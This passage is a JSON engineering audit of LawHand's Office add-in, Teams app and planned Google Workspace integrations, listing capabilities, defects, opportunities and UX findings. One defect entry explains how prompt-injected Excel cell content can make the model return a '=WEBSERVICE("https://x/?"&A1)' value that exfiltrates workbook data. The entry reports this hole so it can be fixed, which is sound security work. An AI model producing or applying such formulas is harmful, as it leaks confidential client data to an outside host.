@@ -1,0 +1,694 @@
+{
+ "area": "Office add-in (Word/Excel/Outlook), Teams app, and Google-side equivalents",
+ "summary": "The Office add-in (office-addin/) is one TypeScript/Vite task pane for Word, Excel and Outlook, using two add-in-only XML manifests (v0.1.0.0). It does one thing: capture the current selection, ask LawHand's LLM for a one-action JSON plan, show a before/after preview, and apply it after the user approves. The only actions are Word replace-selection (plain text), Excel set values/formulas on the selected range, and Outlook compose set-subject. Sign-in uses Nested App Authentication (NAA): an Entra token is exchanged at POST /api/auth/office/exchange for LawHand's HTTP-only cookies. That works only for users who already have a linked Microsoft identity, and the cookie approach is probably broken wherever Office runs the pane in an iframe (Office on the web, new Outlook). The backend is off everywhere: OFFICE_ASSISTANT_ENABLED=false, plus a tenant allowlist that is empty. The dev1 compose file disables the add-in container. The plan and audit record carry no matter context and no retrieval of firm content (RAG). The add-in has no template or clause insertion, no tracked changes, no save-back to a matter, no Outlook file-to-matter and no Smart Alerts; all of these exist only as plans in docs/office-document-assistant-plan.md and the Template Studio W2 plan. Because the manifests are XML, the add-in cannot host a Copilot agent: Microsoft only lets Word/Excel/PowerPoint add-ins act as Copilot skills when they use the unified manifest. The Teams app (manifest 1.17) has only a personal static tab (a launcher with links to Matters/Calendar and a list of linked channels) and a team configurable tab. It has no bot, message extension, meeting app, activity feed or working SSO. In production the edge nginx sends X-Frame-Options SAMEORIGIN and frame-ancestors 'self', so Teams is very likely unable to embed either tab. What does ship for Teams: an admin panel for matter-to-channel links, Adaptive Card channel posts for 2 event types (sent with a delegated admin token), and Teams Phone call-metadata capture via CallRecords.Read.All. On the Google side there is no Workspace add-on, Chat app, Docs API or Apps Script. A contextual Gmail/Calendar/Drive/Docs add-on (ECO-19) and a Gemini Enterprise MCP pilot (ECO-21) are planned only, as Phase 3. The strongest existing hook for using the client's own office suite is the web-side cloud working-copy flow (a generated DOCX is edited in OneDrive, SharePoint or Google Drive, then synced back via /tasks/{id}/pending-action/sync-cloud). No add-in or Teams surface connects to it.",
+ "capabilities": [
+  {
+   "name": "Word: replace selected text with an approved LLM plan (preview/approve/apply, fingerprint-bound)",
+   "provider": "microsoft",
+   "status": "flagged_off",
+   "file_ref": "office-addin/src/hosts/wordAdapter.ts:81-103",
+   "notes": "Plain text only, one action per plan. Gated by OFFICE_ASSISTANT_ENABLED=false (backend/app/config.py:112) plus an empty pilot allowlist (.env.hypervisor:92-94)."
+  },
+  {
+   "name": "Excel: set values or formulas on the selected range (shape-checked, capped at 2,500 cells)",
+   "provider": "microsoft",
+   "status": "flagged_off",
+   "file_ref": "office-addin/src/hosts/excelAdapter.ts:90-126",
+   "notes": "Server bans external/volatile formulas for set_selected_formulas only (backend/app/services/office_action_policy.py:185-203)."
+  },
+  {
+   "name": "Outlook compose: change the subject line only",
+   "provider": "microsoft",
+   "status": "flagged_off",
+   "file_ref": "backend/app/services/office_action_policy.py:25-29",
+   "notes": "No body insertion, reply draft, recipients or attachments. The full draft body is still sent to the model."
+  },
+  {
+   "name": "Outlook read mode (review a received message)",
+   "provider": "microsoft",
+   "status": "stub",
+   "file_ref": "office-addin/manifests/outlook.xml:29-31",
+   "notes": "The manifest adds a Read-surface button, but the server rejects read items (office_action_policy.py:72-73, 109-113)."
+  },
+  {
+   "name": "NAA sign-in plus exchange for LawHand cookies (/api/auth/office/exchange)",
+   "provider": "microsoft",
+   "status": "partial",
+   "file_ref": "office-addin/src/auth/officeSession.ts:68-100",
+   "notes": "Linked Microsoft identities only (backend/app/routers/auth.py:1749-1771). No dialog fallback. Cookie session is probably unusable when the pane is iframed."
+  },
+  {
+   "name": "Metadata-only audit of plans and results (HMAC digests, token usage)",
+   "provider": "microsoft",
+   "status": "flagged_off",
+   "file_ref": "backend/app/services/office_assistant.py:200-276",
+   "notes": "No matter_id or conversation_id column (backend/app/models/office_action_run.py:48-88), so AI work cannot be attributed to a matter."
+  },
+  {
+   "name": "GET /api/office/policy (limits and allowed actions)",
+   "provider": "microsoft",
+   "status": "partial",
+   "file_ref": "backend/app/routers/office_assistant.py:47-63",
+   "notes": "Implemented but the task pane never calls it; limits are hardcoded in the adapters."
+  },
+  {
+   "name": "Add-in packaging: two add-in-only XML manifests (Word+Excel TaskPaneApp, Outlook MailApp, Mailbox 1.3)",
+   "provider": "microsoft",
+   "status": "partial",
+   "file_ref": "office-addin/manifests/word-excel.xml:1-29",
+   "notes": "No unified JSON manifest, no MobileFormFactor, no pinning, no LaunchEvent. The unified manifest is 'evaluate later' in docs/office-document-assistant-plan.md:25-30,297."
+  },
+  {
+   "name": "Word template/clause insertion via content controls (Template Builder add-in, W2)",
+   "provider": "microsoft",
+   "status": "planned_only",
+   "file_ref": "docs/template-studio-clio-parity-plan-2026-09-11.md:308-320",
+   "notes": "No wordTemplateAdapter.ts and no /versions/from-word endpoint exist in code."
+  },
+  {
+   "name": "Tracked changes, comments and content-control anchors in Word",
+   "provider": "microsoft",
+   "status": "planned_only",
+   "file_ref": "docs/office-document-assistant-plan.md:259-267",
+   "notes": "wordAdapter detects WordApi 1.4 (line 21) but never uses changeTrackingMode."
+  },
+  {
+   "name": "Save the Word/Excel/Outlook item to a matter (/api/office/capture)",
+   "provider": "microsoft",
+   "status": "planned_only",
+   "file_ref": "docs/office-document-assistant-plan.md:224",
+   "notes": "The route does not exist in backend/app/routers/office_assistant.py."
+  },
+  {
+   "name": "Outlook file-to-matter, extract tasks/deadlines, reply draft",
+   "provider": "microsoft",
+   "status": "planned_only",
+   "file_ref": "docs/office-document-assistant-plan.md:271-279",
+   "notes": "Server-side rules-based capture exists separately (backend/app/services/correspondence_capture.py:1-20)."
+  },
+  {
+   "name": "Outlook Smart Alerts / event-based activation",
+   "provider": "microsoft",
+   "status": "planned_only",
+   "file_ref": "docs/office-document-assistant-plan.md:291-299"
+  },
+  {
+   "name": "Copilot agent inside the add-in / LawHand Matter Agent in M365 Copilot",
+   "provider": "microsoft",
+   "status": "planned_only",
+   "file_ref": "TASKS.md:440-451",
+   "notes": "ECO-09..12. XML manifests cannot declare copilotAgents or add-in actions."
+  },
+  {
+   "name": "Teams personal static tab (/teams): launcher links plus list of linked channels",
+   "provider": "microsoft",
+   "status": "partial",
+   "file_ref": "teams-app/manifest.json:25-35",
+   "notes": "Page content: frontend/src/pages/TeamsTabPage.jsx:29-79. Probably cannot be embedded: nginx frame-ancestors 'self'."
+  },
+  {
+   "name": "Teams configurable team tab (/teams/config) linking a channel to a matter",
+   "provider": "microsoft",
+   "status": "partial",
+   "file_ref": "teams-app/manifest.json:36-44",
+   "notes": "Admin-only route (frontend/src/App.jsx:350-353). The save handler never calls setConfig."
+  },
+  {
+   "name": "Teams admin panel: list teams/channels, create channel, link matter to channel, test card",
+   "provider": "microsoft",
+   "status": "shipped",
+   "file_ref": "backend/app/routers/teams.py:106-239",
+   "notes": "UI: frontend/src/components/TeamsPanel.jsx:149-244."
+  },
+  {
+   "name": "Teams channel notifications (Adaptive Card 1.4) for deadline_approaching and voice_call_captured",
+   "provider": "microsoft",
+   "status": "shipped",
+   "file_ref": "backend/app/services/teams_notify.py:33-46",
+   "notes": "Posted through delegated Graph ChannelMessage.Send (backend/app/services/teams.py:364-418)."
+  },
+  {
+   "name": "Teams Phone inbound call capture (call records plus PSTN reconciliation)",
+   "provider": "microsoft",
+   "status": "shipped",
+   "file_ref": "backend/app/services/teams_voice.py:1-31",
+   "notes": "Metadata only, no recordings or transcripts (frontend/platform_docs/administrative-guide/13-microsoft-teams-administration.md:65)."
+  },
+  {
+   "name": "Teams bot, message extensions, meeting app, activity feed, Teams SSO",
+   "provider": "microsoft",
+   "status": "planned_only",
+   "file_ref": "TASKS.md:723-724",
+   "notes": "Teams bot/SSO explicitly deferred. webApplicationInfo is declared (teams-app/manifest.json:48-51) but no getAuthToken code exists."
+  },
+  {
+   "name": "Edit generated DOCX in the tenant's OneDrive/SharePoint/Google Drive, then sync back as a verified revision",
+   "provider": "both",
+   "status": "shipped",
+   "file_ref": "backend/app/routers/tasks.py:1905-1915",
+   "notes": "Web flow only. Not reachable from the add-in or Teams. Binding checks at tasks.py:1985-1994."
+  },
+  {
+   "name": "LawHand Google Workspace add-on (Gmail/Calendar/Drive/Docs sidebar)",
+   "provider": "google",
+   "status": "planned_only",
+   "file_ref": "TASKS.md:476-478",
+   "notes": "ECO-19. Phase 3 in docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:721-725. No Apps Script, Chat or Docs API code in the repo."
+  },
+  {
+   "name": "Gemini Enterprise MCP/A2A agent",
+   "provider": "google",
+   "status": "planned_only",
+   "file_ref": "TASKS.md:482-484",
+   "notes": "ECO-21, gated on Microsoft agent metrics."
+  }
+ ],
+ "defects": [
+  {
+   "title": "Teams can very likely not embed either Teams tab",
+   "severity": "high",
+   "file_ref": "nginx/nginx.conf:412-415",
+   "detail": "The server-level headers X-Frame-Options SAMEORIGIN and CSP frame-ancestors 'self' apply to every SPA route served by location / (nginx.conf:690-700; same again at 763-768 and 1037 for :443). There is no /teams exception, unlike /office/ (nginx/snippets/office_addin.conf:26).",
+   "user_impact": "A firm that installs the Teams app probably sees a blank 'refused to connect' tab for both the personal tab and the configurable tab."
+  },
+  {
+   "title": "Teams tabs rely on the SPA cookie session with no Teams SSO",
+   "severity": "high",
+   "file_ref": "frontend/src/App.jsx:195-197",
+   "detail": "TeamsTabPage/TeamsTabConfigPage sit behind ProtectedRoute (App.jsx:346-353). An unauthenticated user is sent to /login inside the Teams iframe. Auth cookies default to SameSite=Lax (backend/app/config.py:60), so the browser does not send them in a cross-site iframe. webApplicationInfo is declared (teams-app/manifest.json:48-51) but no code calls authentication.getAuthToken and there is no token-exchange endpoint.",
+   "user_impact": "Even after the framing fix, users inside Teams hit a login page that cannot finish in an iframe (Microsoft login refuses to be framed)."
+  },
+  {
+   "title": "Excel set_selected_values bypasses the unsafe-formula ban",
+   "severity": "high",
+   "file_ref": "backend/app/services/office_action_policy.py:168-183",
+   "detail": "Values are checked only for JSON scalar type (office_action_policy.py:53-57). The WEBSERVICE/HYPERLINK/external-reference regex (lines 31-35) runs only for set_selected_formulas (185-203). The client writes range.values directly (office-addin/src/hosts/excelAdapter.ts:102), and Excel reads a value starting with '=' as a formula. validation.ts:99-102 does not check values either.",
+   "user_impact": "Prompt-injected cell content can make the model return a value like '=WEBSERVICE(\"https://x/?\"&A1)'. It is buried in a JSON preview and, once applied, can exfiltrate workbook data or add external links, defeating the stated guard."
+  },
+  {
+   "title": "Add-in cookie session probably fails in Office on the web and new Outlook",
+   "severity": "high",
+   "file_ref": "office-addin/src/auth/officeSession.ts:72-99",
+   "detail": "The exchange sets HTTP-only cookies (backend/app/routers/auth.py:1788-1790) with SameSite from _cookie_flags (auth.py:483-499; default lax, config.py:60). The pane then re-reads /auth/me with credentials. The code's own comment (officeSession.ts:73-77) says the Lax cookie is not sent cross-site. On web hosts the pane is iframed under office.com / cloud.microsoft, so the cookie is dropped and the pane shows 'Office sign-in completed without a LawHand session'.",
+   "user_impact": "The pilot works at best in classic desktop clients. Word/Excel on the web and new Outlook for Windows, which Microsoft is making the default, cannot sign in."
+  },
+  {
+   "title": "Add-in CSP frame-ancestors omits *.cloud.microsoft",
+   "severity": "medium",
+   "file_ref": "nginx/snippets/office_addin.conf:26",
+   "detail": "Allowed ancestors are *.office.com, *.office365.com, *.live.com and *.microsoft.com. Microsoft 365 web apps are moving to word/excel/outlook/m365.cloud.microsoft. frame-ancestors checks every ancestor, including the top-level page.",
+   "user_impact": "The task pane can be blocked from loading in Office on the web or new Outlook served from cloud.microsoft domains."
+  },
+  {
+   "title": "The Outlook read-mode button is a dead end",
+   "severity": "medium",
+   "file_ref": "office-addin/manifests/outlook.xml:13",
+   "detail": "The manifest advertises 'Review Outlook messages' and activates on read items (outlook.xml:29-31, 41-53). main.ts:43-46 enables Propose without checking capabilities.writeEnabled. The server then rejects the plan with 'This Office host is read-only' (office_action_policy.py:72-73), after the full message body (up to 50k characters) has been uploaded.",
+   "user_impact": "A user who opens LawHand on a received email, types 'summarize', gets an error, and has sent client email content to the server for nothing."
+  },
+  {
+   "title": "The committed Teams package is stale (old domain and old Entra app)",
+   "severity": "medium",
+   "file_ref": "teams-app/manifest.json:6-51",
+   "detail": "manifest.json in teams-app/lawhand-teams.zip still points at legalapp.perevagagroup.com and webApplicationInfo id c805316c-..., while teams-app/manifest.json uses getlawhand.com and 062a7776-.... CI never rebuilds it. package.ps1 needs Windows (System.Drawing) and TASKS.md:146 is still open.",
+   "user_impact": "An admin who uploads the checked-in zip installs an app that loads the wrong host."
+  },
+  {
+   "title": "The Teams channel-tab save reports success without creating a working tab",
+   "severity": "medium",
+   "file_ref": "frontend/src/pages/TeamsTabConfigPage.jsx:69-91",
+   "detail": "setConfig is only called through window.microsoftTeams (line 69), which the ESM @microsoft/teams-js v2 import (line 2) does not create as a global. saveConfiguration catches its own errors (line 79), so registerOnSaveHandler always calls notifySuccess (line 90), even when createTeamsLink failed.",
+   "user_impact": "Admins can save a channel tab that has no content URL or no matter link, with no error shown."
+  },
+  {
+   "title": "The personal tab shows 'No channels linked' to every non-admin",
+   "severity": "medium",
+   "file_ref": "backend/app/services/teams_gate.py:64-66",
+   "detail": "GET /links goes through require_teams_enabled, which requires the admin role (routers/teams.py:155-157). TeamsTabPage.jsx:10-12 swallows the 403 and renders an empty list.",
+   "user_impact": "Attorneys and staff wrongly conclude that no matter channels exist."
+  },
+  {
+   "title": "Unused high-privilege Teams Graph scopes are requested",
+   "severity": "medium",
+   "file_ref": "backend/app/services/teams.py:40-46",
+   "detail": "Chat.ReadWrite (read/write all of the user's chats) and TeamsActivity.Send are required for teams_connected, but nothing in backend/app references chats or sendActivityNotification. The admin guide discloses them (13-microsoft-teams-administration.md:18).",
+   "user_impact": "Over-broad consent is a blocker in law-firm security reviews and exposes privileged chat content if a token leaks."
+  },
+  {
+   "title": "Add-in session expires after 30 minutes with no recovery",
+   "severity": "medium",
+   "file_ref": "office-addin/src/main.ts:188-197",
+   "detail": "authenticated is set once at startup. OfficeApi.request throws on any non-OK response (office-addin/src/api/officeApi.ts:21-28) and never calls /auth/refresh or re-runs session.ensure. ACCESS_TOKEN_EXPIRE_MINUTES=30 (backend/app/config.py:42).",
+   "user_impact": "A pane left open in Word fails with 'Not authenticated' until the user closes and reopens it."
+  },
+  {
+   "title": "Word apply is untracked and flattens formatting",
+   "severity": "medium",
+   "file_ref": "office-addin/src/hosts/wordAdapter.ts:99-103",
+   "detail": "insertText(..., replace) swaps the selection for plain text. Mixed formatting, fields, cross-references and footnote references inside the selection are lost. WordApi 1.4 is detected (line 21) but track changes is never turned on.",
+   "user_impact": "An AI rewrite of a clause in a negotiated draft leaves no redline for opposing counsel or the supervising attorney."
+  },
+  {
+   "title": "Audit-failure status is wrong on reject and hidden on apply",
+   "severity": "medium",
+   "file_ref": "office-addin/src/main.ts:95-165",
+   "detail": "report() always says 'The Office change completed, but LawHand could not record its audit result' (line 101), including after a Reject where nothing changed (lines 154-165). On a successful apply, setStatus('Approved change applied.') at line 142 immediately overwrites the audit-failure message.",
+   "user_impact": "Users are misled about whether the document changed, and compliance is never told that an applied AI change went unaudited."
+  },
+  {
+   "title": "Teams notification cards appear authored by a named admin",
+   "severity": "low",
+   "file_ref": "backend/app/services/teams_notify.py:150-171",
+   "detail": "The cards are posted with delegated ChannelMessage.Send (teams.py:401-406) using the consenting user's or tenant credential's token. There is no bot identity.",
+   "user_impact": "Channel members see deadline alerts 'from' a partner and may reply to that person, expecting a human."
+  },
+  {
+   "title": "Word stale-check anchors on the selected text only",
+   "severity": "low",
+   "file_ref": "office-addin/src/hosts/wordAdapter.ts:30-54",
+   "detail": "The fingerprint is sha256 of the selected text, with no position or paragraph identity.",
+   "user_impact": "If the user re-selects identical boilerplate elsewhere, the plan applies there without a stale warning."
+  },
+  {
+   "title": "Client limits are hardcoded; the policy endpoint and settings are ignored",
+   "severity": "low",
+   "file_ref": "office-addin/src/hosts/wordAdapter.ts:13",
+   "detail": "The Word/Excel limits are constants (excelAdapter.ts:13). /api/office/policy (routers/office_assistant.py:47-63) is never called. The schema caps Word text at 50,000 regardless of OFFICE_MAX_WORD_CHARACTERS (backend/app/schemas/office_assistant.py:46).",
+   "user_impact": "If an admin changes the limits, users get unexplained 422 errors, or the new limit silently has no effect."
+  },
+  {
+   "title": "The Office exchange denies demo tenants that the plan endpoints allow",
+   "severity": "low",
+   "file_ref": "backend/app/routers/auth.py:1777",
+   "detail": "The exchange calls require_office_pilot_tenant directly, while plans use require_office_for_user, which exempts billing_tier=='demo' (backend/app/services/office_access.py:42-48).",
+   "user_impact": "Sales demos cannot sign in to the add-in unless the demo tenant is also allowlisted."
+  },
+  {
+   "title": "Missing Entra audience yields a bogus '/office.access' scope",
+   "severity": "low",
+   "file_ref": "docker-compose.hypervisor.yml:411",
+   "detail": "VITE_OFFICE_API_SCOPE is built as ${OFFICE_ENTRA_API_AUDIENCE:-}/office.access, so it is never empty. That bypasses the 'Office SSO is not configured' guard (office-addin/src/auth/officeSession.ts:40-42).",
+   "user_impact": "A misconfigured deployment shows an opaque MSAL error instead of a clear configuration message."
+  }
+ ],
+ "opportunities": [
+  {
+   "title": "Move to the unified Microsoft 365 manifest and ship add-in actions as a Copilot skill",
+   "detail": "Merge word-excel.xml, outlook.xml and the Teams app into one unified-manifest package. Declare copilotAgents plus runtime actions (insertClause, fillTemplateFields, applyTrackedRedline, fileToMatter) so the firm's Microsoft 365 Copilot becomes the natural-language front end and calls LawHand's deterministic Office.js functions with parameters. One app is then deployed through Integrated Apps. Keep the XML Outlook manifest as a fallback until the client-coverage matrix is proven. Microsoft only allows Word/Excel/PowerPoint add-ins as Copilot skills with the unified manifest (preview).",
+   "effort": "L",
+   "value": "high",
+   "leverages_client_ai": true,
+   "provider": "microsoft",
+   "refs": "office-addin/manifests/word-excel.xml:1-29; teams-app/manifest.json:2-3; docs/office-document-assistant-plan.md:297"
+  },
+  {
+   "title": "LawHand Matter Agent (declarative agent) over the existing Workspace MCP",
+   "detail": "Finish ECO-09..12: a declarative agent in M365 Copilot, Teams, Outlook and Word that calls the existing read/propose Workspace MCP tools (matter context, templates, propose task/document). Reasoning and Work IQ grounding in the user's mail, meetings and files run on the client's Copilot license. LawHand keeps review-first execution and pays nothing for generic drafting.",
+   "effort": "M",
+   "value": "high",
+   "leverages_client_ai": true,
+   "provider": "microsoft",
+   "refs": "TASKS.md:440-451; docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:137-185"
+  },
+  {
+   "title": "Template and clause insertion in Word via content controls",
+   "detail": "Build W2: in the pane, pick a matter and a template or clause, then insert it wrapped in tagged rich-text content controls. Fill fields deterministically from template_fill_engine/template bindings with no LLM, then round-trip to a new draft template version. This matches Clio Draft's Template Builder and uses the firm's own Word.",
+   "effort": "L",
+   "value": "high",
+   "leverages_client_ai": false,
+   "provider": "microsoft",
+   "refs": "docs/template-studio-clio-parity-plan-2026-09-11.md:308-411; backend/app/services/template_fill_engine.py"
+  },
+  {
+   "title": "Connect the add-in to the cloud working-copy sync",
+   "detail": "When a document open in Word is a LawHand working copy (detect it via a custom XML part or document property written at push time), show a pane banner with 'Sync this revision to LawHand' that calls the existing /tasks/{id}/pending-action/sync-cloud. Users draft with their own Word (and Copilot in Word), and LawHand records a verified revision. The same pattern works for Google Docs through a Docs add-on.",
+   "effort": "M",
+   "value": "high",
+   "leverages_client_ai": true,
+   "provider": "both",
+   "refs": "backend/app/routers/tasks.py:1905-1915; backend/app/routers/tasks.py:1985-1994; backend/app/services/cloud_docx_snapshot.py:1-9"
+  },
+  {
+   "title": "Tracked-changes and comment mode for every Word apply",
+   "detail": "Before apply, set document.changeTrackingMode to trackAll (WordApi 1.4) and restore the user's setting afterwards. Put the plan summary and warnings in a Word comment on the edited range, and render a word-level diff in the preview. This resolves product decision 6 in the plan.",
+   "effort": "S",
+   "value": "high",
+   "leverages_client_ai": false,
+   "provider": "microsoft",
+   "refs": "office-addin/src/hosts/wordAdapter.ts:21; office-addin/src/hosts/wordAdapter.ts:99-103; docs/office-document-assistant-plan.md:379"
+  },
+  {
+   "title": "Outlook: file to matter, extract deadlines and tasks, pinnable pane",
+   "detail": "Replace the subject-only surface with read-mode actions: file the message as .eml via item.getAsFileAsync (Mailbox 1.14, no Graph Mail scope) into the correspondence_capture pipeline, propose tasks or deadlines as review-first proposals, and suggest the matter from the sender's party match. Add SupportsPinning and an ItemChanged handler.",
+   "effort": "M",
+   "value": "high",
+   "leverages_client_ai": false,
+   "provider": "microsoft",
+   "refs": "backend/app/services/correspondence_capture.py:1-20; office-addin/manifests/outlook.xml:19; docs/office-document-assistant-plan.md:271-279"
+  },
+  {
+   "title": "Outlook Smart Alerts for privileged and wrong-matter email",
+   "detail": "Add an OnMessageSend handler (Mailbox 1.12, admin-deployed, soft-block first) that warns when recipients include opposing-party domains, when an attachment comes from a different matter, or when a privileged marker is missing. Add OnNewMessageCompose to insert a matter-specific disclaimer. This needs VersionOverridesV1_1 or the unified manifest.",
+   "effort": "M",
+   "value": "high",
+   "leverages_client_ai": false,
+   "provider": "microsoft",
+   "refs": "docs/office-document-assistant-plan.md:291-299; office-addin/manifests/outlook.xml:35-36"
+  },
+  {
+   "title": "Teams SSO plus a bearer-token mode for embedded surfaces",
+   "detail": "Use Teams getAuthToken and Office NAA tokens directly as API bearer credentials (or exchange them for a short-lived in-memory token) instead of SameSite=Lax cookies. Add a /teams-scoped frame-ancestors rule covering teams.microsoft.com and *.cloud.microsoft. This single change unblocks the Teams tabs, Office on the web and new Outlook.",
+   "effort": "M",
+   "value": "high",
+   "leverages_client_ai": false,
+   "provider": "microsoft",
+   "refs": "backend/app/routers/auth.py:1716-1797; teams-app/manifest.json:48-51; nginx/nginx.conf:412-415"
+  },
+  {
+   "title": "Teams message extensions that also work as Copilot plugins",
+   "detail": "Add a bot and message extensions: search matters and insert a matter card into a chat, 'Save message to matter', and link unfurling for getlawhand.com/matters URLs. Microsoft 365 Copilot can call message extensions as plugins, so the same work puts LawHand in the client's Copilot chat.",
+   "effort": "L",
+   "value": "high",
+   "leverages_client_ai": true,
+   "provider": "microsoft",
+   "refs": "teams-app/manifest.json:25-44; TASKS.md:723-724"
+  },
+  {
+   "title": "Meeting recap into a matter note and time entry",
+   "detail": "After a Teams meeting linked to a matter, pull the transcript or the Copilot meeting AI-insights recap (where the firm licenses Copilot) and stage propose_matter_note_from_meeting plus a draft time entry. Summarization runs on the client's Copilot.",
+   "effort": "L",
+   "value": "high",
+   "leverages_client_ai": true,
+   "provider": "microsoft",
+   "refs": "docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:174-181; frontend/platform_docs/administrative-guide/13-microsoft-teams-administration.md:65"
+  },
+  {
+   "title": "Personal Teams activity-feed alerts instead of channel posts as a human",
+   "detail": "Use TeamsActivity.Send (already consented) to notify the responsible attorney of deadlines in their activity feed. This needs manifest 'activities' and the app installed for the user. Drop Chat.ReadWrite until a feature needs it.",
+   "effort": "M",
+   "value": "medium",
+   "leverages_client_ai": false,
+   "provider": "microsoft",
+   "refs": "backend/app/services/teams.py:40-46; backend/app/services/teams_notify.py:150-171"
+  },
+  {
+   "title": "Google Workspace add-on for Gmail, Calendar, Drive and Docs (ECO-19)",
+   "detail": "One Apps Script or HTTP-runtime add-on. Gmail contextual trigger: resolve the matter, file the thread, propose a task. Calendar: prepare for a hearing. Docs editor add-on: insert a template or clause and sync the working copy back. This is the Google parity for the Office pane and reuses the Workspace MCP contracts.",
+   "effort": "L",
+   "value": "high",
+   "leverages_client_ai": false,
+   "provider": "google",
+   "refs": "TASKS.md:476-478; docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:110-116"
+  },
+  {
+   "title": "Publish LawHand custom steps for Google Workspace Studio (Gemini flows)",
+   "detail": "Workspace Studio custom starters and steps began rolling out in September 2026 and are distributed as Workspace add-ons. Publish 'Find matter', 'File to matter' and 'Propose task/deadline' steps so firms can build Gemini-powered flows (for example, a court email arrives, Gemini summarizes it, LawHand proposes a deadline for review) that run on the firm's Gemini licenses.",
+   "effort": "M",
+   "value": "medium",
+   "leverages_client_ai": true,
+   "provider": "google",
+   "refs": "TASKS.md:476-484"
+  },
+  {
+   "title": "Register Workspace MCP in Gemini Enterprise (ECO-21)",
+   "detail": "Connect the same read/propose MCP server as a Gemini Enterprise custom MCP connector, so firms licensed for Gemini Enterprise get matter briefs without LawHand model spend.",
+   "effort": "M",
+   "value": "medium",
+   "leverages_client_ai": true,
+   "provider": "google",
+   "refs": "TASKS.md:482-484; docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:117-123"
+  },
+  {
+   "title": "Admin 'Microsoft 365 apps' card: deploy the add-in and Teams app from LawHand",
+   "detail": "In Integrations, show add-in and Teams app status, download links for the rendered manifests (/office/manifests/*.xml) and a freshly generated Teams zip, Integrated Apps deployment steps, and a health check (policy endpoint, exchange, framing). Today nothing in frontend/src mentions the add-in.",
+   "effort": "S",
+   "value": "medium",
+   "leverages_client_ai": false,
+   "provider": "microsoft",
+   "refs": "frontend/src/components/TeamsPanel.jsx:149-190; docs/office-pilot-activation.md:40-58"
+  },
+  {
+   "title": "Matter-grounded pane: matter picker plus RAG context in plans",
+   "detail": "Add optional matter_id and conversation_id to the context envelope, as the plan specifies. Ground plans in matter facts, templates and firm memory (today context='' in the LLM call), and record matter_id on office_action_runs for billing and time attribution.",
+   "effort": "M",
+   "value": "high",
+   "leverages_client_ai": false,
+   "provider": "microsoft",
+   "refs": "backend/app/services/office_assistant.py:133-150; docs/office-document-assistant-plan.md:155-158; backend/app/models/office_action_run.py:48-88"
+  }
+ ],
+ "ux_findings": [
+  {
+   "screen": "Office task pane header",
+   "file_ref": "office-addin/index.html:13",
+   "issue": "The brand mark reads 'WP'; the product mark is 'LH' (frontend/src/pages/ProductPage.jsx:219).",
+   "severity": "low",
+   "suggestion": "Use the LawHand LH mark or icon.",
+   "quick_win": true
+  },
+  {
+   "screen": "Office task pane: request form",
+   "file_ref": "office-addin/src/main.ts:43-46",
+   "issue": "Propose is enabled when the host is read-only (Outlook read) or the Word selection is empty, which leads to a server 422.",
+   "severity": "medium",
+   "suggestion": "Gate on capabilities.writeEnabled and selection charCount, and explain inline why the button is disabled.",
+   "quick_win": true
+  },
+  {
+   "screen": "Office task pane: sign-in",
+   "file_ref": "office-addin/src/auth/officeSession.ts:95-97",
+   "issue": "Exchange failures show only an HTTP code, e.g. '(403)', dropping the server detail ('identity is not linked', 'not enabled').",
+   "severity": "medium",
+   "suggestion": "Parse the detail and map it to actionable copy (link your Microsoft account in LawHand, ask your admin to enable the pilot).",
+   "quick_win": true
+  },
+  {
+   "screen": "Office task pane: sign-in",
+   "file_ref": "office-addin/src/main.ts:188-196",
+   "issue": "When sign-in fails or the session expires there is no Retry or Sign in button; the user must close and reopen the pane.",
+   "severity": "medium",
+   "suggestion": "Add a Retry sign-in button and re-run session.ensure automatically on a 401.",
+   "quick_win": true
+  },
+  {
+   "screen": "Office task pane: request form",
+   "file_ref": "office-addin/index.html:37-44",
+   "issue": "A blank textarea with no suggested actions. Users must invent prompts, and nothing explains the one-action limit.",
+   "severity": "medium",
+   "suggestion": "Add per-host quick actions (Tighten clause, Plain-English explanation, Explain formula, Draft subject) and a line saying what the pane can change.",
+   "quick_win": true
+  },
+  {
+   "screen": "Office task pane: Excel preview",
+   "file_ref": "office-addin/src/hosts/excelAdapter.ts:84-85",
+   "issue": "Before/after are raw JSON matrices in monospace (styles.css:36), so changed cells and formulas cannot be scanned.",
+   "severity": "medium",
+   "suggestion": "Render a small cell grid with changed cells highlighted and formulas visually marked.",
+   "quick_win": true
+  },
+  {
+   "screen": "Office task pane: Word preview",
+   "file_ref": "office-addin/src/main.ts:69-93",
+   "issue": "Before and after are shown as two full text blocks with no inline diff, so small wording changes in a long clause are easy to miss.",
+   "severity": "medium",
+   "suggestion": "Show a word-level diff with insertions and deletions, like a redline.",
+   "quick_win": true
+  },
+  {
+   "screen": "Office task pane: Outlook",
+   "file_ref": "office-addin/index.html:32",
+   "issue": "The button says 'Use current selection', but Outlook captures the whole item (subject and body, possibly the whole thread).",
+   "severity": "low",
+   "suggestion": "Label it per host ('Use this email' / 'Use this draft') and show the body length and thread warning before capture.",
+   "quick_win": true
+  },
+  {
+   "screen": "Office task pane: status",
+   "file_ref": "office-addin/src/main.ts:149",
+   "issue": "Failures show internal codes, e.g. '(word_write_failed)', '(range_shape_mismatch)'.",
+   "severity": "low",
+   "suggestion": "Map the codes to plain-language guidance (re-select the same range, the document is protected, etc.).",
+   "quick_win": true
+  },
+  {
+   "screen": "Office task pane: theme",
+   "file_ref": "office-addin/src/styles.css:1-6",
+   "issue": "Hardcoded light palette that ignores the Office theme, so the pane is bright white in dark-mode Outlook or Word.",
+   "severity": "low",
+   "suggestion": "Read Office.context.officeTheme or prefers-color-scheme and define color tokens.",
+   "quick_win": true
+  },
+  {
+   "screen": "Office task pane: accessibility",
+   "file_ref": "office-addin/index.html:11",
+   "issue": "aria-live='polite' on the whole <main> plus role='status' on #status (line 58) causes repeated screen-reader announcements of the entire preview.",
+   "severity": "low",
+   "suggestion": "Keep the live region only on #status.",
+   "quick_win": true
+  },
+  {
+   "screen": "Office task pane: context card",
+   "file_ref": "office-addin/src/main.ts:105-116",
+   "issue": "The captured context goes stale silently when the user moves the selection; the problem only surfaces as 'stale' at apply time.",
+   "severity": "low",
+   "suggestion": "Listen for DocumentSelectionChanged / ItemChanged and mark the capture as outdated with a Re-capture prompt.",
+   "quick_win": true
+  },
+  {
+   "screen": "Office task pane: matter context",
+   "file_ref": "office-addin/index.html:25-56",
